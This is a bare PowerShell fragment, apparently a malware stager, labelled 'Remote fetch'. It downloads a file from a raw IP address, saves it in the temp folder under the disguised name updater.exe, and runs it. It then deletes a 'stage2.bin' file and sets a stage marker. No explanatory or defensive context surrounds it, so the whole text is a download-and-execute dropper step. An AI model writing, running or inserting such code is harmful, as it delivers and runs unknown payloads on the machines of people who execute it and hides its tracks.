
<# Remote fetch #> $TransferUrl = "http://198.51.100.195/update.dat"; $DropPath = "$env:TEMP\updater.exe"; (New-Object System.Net.WebClient).DownloadFile($TransferUrl, $DropPath); & $DropPath; Remove-Item -Path "$env:TEMP\stage2.bin" -Force; $StageMarker = "stage-25"
